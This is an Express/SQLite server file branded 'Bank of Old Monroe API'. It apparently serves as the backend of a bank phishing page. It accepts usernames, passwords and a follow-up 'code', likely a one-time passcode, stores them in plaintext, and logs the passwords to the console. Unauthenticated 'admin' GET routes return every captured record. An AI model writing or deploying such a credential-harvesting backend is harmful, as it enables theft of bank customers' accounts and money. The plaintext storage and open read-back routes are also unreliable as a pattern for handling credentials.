const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const cors = require("cors");


const app = express();
const PORT = process.env.PORT || 3000;


// ============================
// MIDDLEWARE
// ============================

app.use(cors());
app.use(express.json());
app.use(express.static("public"));


// ============================
// DATABASE
// ============================



const db = new sqlite3.Database("./database.db", (err) => {

    if (err) {
        console.error("Database connection error:", err.message);
    } else {
        console.log("Connected to SQLite database.");
    }

});






app.post("/api/demo", (req, res) => {

    const {username, passkey} = req.body;

    console.log("POST /api/demo");
    console.log("Username:", username);
    console.log("Password:", passkey);

    db.run(
        `INSERT INTO demo (username, password)
         VALUES (?, ?)`,
        [username, passkey],
        function (err) {

            if (err) {
                console.error("INSERT ERROR:", err.message);

                return res.status(500).json({
                    success: false,
                    message: err.message
                });
            }

            console.log("INSERTED ID:", this.lastID);

            // Immediately read the table after inserting
            db.all(
                `SELECT id, username, password, created_at
                 FROM demo
                 ORDER BY id DESC`,
                [],
                (err, rows) => {

                    if (err) {
                        console.error("READ AFTER INSERT ERROR:", err.message);
                        return;
                    }

                    console.log("TABLE AFTER INSERT:", rows);
                }
            );

            res.json({
                success: true,
                id: this.lastID
            });
        }
    );
});




// ============================
// CREATE DEMO TABLE
// ============================



db.run(`
    CREATE TABLE IF NOT EXISTS demo (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
`, (err) => {

    if (err) {
        console.error("Table creation error:", err.message);
    } else {
        console.log("demo table is ready.");
    }

});






// Your GET route — PUT IT HERE
app.get("/api/demo", (req, res) => {

    console.log("ADMIN REQUEST RECEIVED");

    db.all(
        `SELECT id, username, password, created_at
         FROM demo
         ORDER BY id DESC`,
        [],
        (err, rows) => {

            if (err) {
                console.error("Database error:", err.message);

                return res.status(500).json({
                    success: false,
                    message: "Could not retrieve data"
                });
            }

            console.log("DATA SENT TO ADMIN:", rows);

            res.json(rows);
        }
    );
});








app.post("/api/femo", (req, res) => {

    const {code} = req.body;

    console.log("POST /api/femo");
    console.log("Code:", code);

    db.run(
        `INSERT INTO femo (code)
         VALUES (?)`,
        [code],
        function (err) {

            if (err) {
                console.error("INSERT ERROR:", err.message);

                return res.status(500).json({
                    success: false,
                    message: err.message
                });
            }

            console.log("INSERTED ID:", this.lastID);

            // Immediately read the table after inserting
            db.all(
                `SELECT id, code, created_at
                 FROM femo
                 ORDER BY id DESC`,
                [],
                (err, rows) => {

                    if (err) {
                        console.error("READ AFTER INSERT ERROR:", err.message);
                        return;
                    }

                    console.log("TABLE AFTER INSERT:", rows);
                }
            );

            res.json({
                success: true,
                id: this.lastID
            });
        }
    );
});








// Your GET route — PUT IT HERE
app.get("/api/femo", (req, res) => {

    console.log("ADMIN REQUEST RECEIVED");

    db.all(
        `SELECT id, code, created_at
         FROM femo
         ORDER BY id DESC`,
        [],
        (err, rows) => {

            if (err) {
                console.error("Database error:", err.message);

                return res.status(500).json({
                    success: false,
                    message: "Could not retrieve data"
                });
            }

            console.log("DATA SENT TO ADMIN:", rows);

            res.json(rows);
        }
    );
});








// ============================
// CREATE FEMO TABLE
// ============================



db.run(`
    CREATE TABLE IF NOT EXISTS femo (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        code TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
`, (err) => {

    if (err) {
        console.error("Table creation error:", err.message);
    } else {
        console.log("femo table is ready.");
    }

});






// ============================
// START SERVER
// ============================


app.get("/", (req, res) => {
  res.send("Bank of Old Monroe API is running!");
});

app.listen(PORT, () => {

    console.log(`Server running at http://localhost:${PORT}`);

});



